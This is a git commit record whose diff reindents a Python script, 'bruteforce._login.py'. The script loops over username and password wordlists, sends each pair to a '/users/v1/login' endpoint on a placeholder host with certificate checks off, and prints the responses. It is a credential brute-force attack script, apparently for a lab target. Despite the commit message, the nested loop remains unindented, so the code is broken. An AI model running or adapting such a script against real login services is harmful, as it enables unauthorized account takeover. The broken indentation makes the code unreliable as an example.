2769c000bdcee2665c18a85d1e1889d713603fe0
David Homoney <david@homoney.com>
2023-09-01 10:57:19 -0500

    updated python spacing errors. fuggin python

--- bruteforce._login.py
+++ bruteforce._login.py
@@ -1,16 +1,16 @@
-         import requests
-         import time
+import requests
+import time
 
-         host = 'http://<HOST_UP>'
-         file1 = open('./passwordlist.txt', 'r')
-         file2 = open('./loginusernames.txt', 'r')
-         PasswordList = file1.read().splitlines()
-         LoginUserList = file2.read().splitlines()
+host = 'http://<HOST_UP>'
+file1 = open('./passwordlist.txt', 'r')
+file2 = open('./loginusernames.txt', 'r')
+PasswordList = file1.read().splitlines()
+LoginUserList = file2.read().splitlines()
 
-         count = 0
-         for username in LoginUserList:
-         for password in PasswordList:
-                 count += 1
-                 r = requests.post(host + '/users/v1/login', json={"username": username, "password": password}, verify=False)
-                 time.sleep(0.1)
-                 print(username + ':' + password + ' | ' + str(r.json()))
+count = 0
+for username in LoginUserList:
+for password in PasswordList:
+        count += 1
+        r = requests.post(host + '/users/v1/login', json={"username": username, "password": password}, verify=False)
+        time.sleep(0.1)
+        print(username + ':' + password + ' | ' + str(r.json()))
